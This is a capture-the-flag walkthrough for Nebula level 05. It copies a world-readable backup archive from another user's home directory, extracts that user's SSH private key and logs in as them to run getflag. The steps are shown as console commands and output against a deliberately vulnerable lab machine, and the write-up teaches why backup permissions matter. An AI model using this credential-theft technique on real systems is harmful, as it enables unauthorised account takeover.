## Challenge
Check the flag05 home directory. You are looking for weak directory permissions.

## Solution
```console
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     200 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
```
`.ssh` looks very interesting, but we have no permissions to access it.

`.backup` looks interesting too, let's have a look:
```console
level05@nebula:/home/flag05$ ls -la .backup
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
```
A backup archive, with read perms, copy to our home dir and extract.
```console
level05@nebula:/home/flag05$ cp .backup/backup-19072011.tgz /home/level05/backup.tgz
level05@nebula:/home/flag05$ cd /home/level05
level05@nebula:~$ tar -xvzf backup.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:~$ cd .ssh
level05@nebula:~/.ssh$ ls -l
total 12
-rw-r--r-- 1 level05 level05  394 2011-07-19 02:37 authorized_keys
-rw------- 1 level05 level05 1675 2011-07-19 02:37 id_rsa
-rw-r--r-- 1 level05 level05  394 2011-07-19 02:37 id_rsa.pub
```
Someone made a mistake, he backed up the `.ssh` folder and set over permissive access to it.
* `authorized_keys` is a list of public keys permitted to login
* `id_rsa` and `id_rsa.pub` are SSH2 private and public key

We can use `id_rsa` to authenticate through SSH.
```console
level05@nebula:~/.ssh$ ssh -i id_rsa flag05@127.0.0.1

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of "levelXX" and password "levelXX", where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '12.04 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```
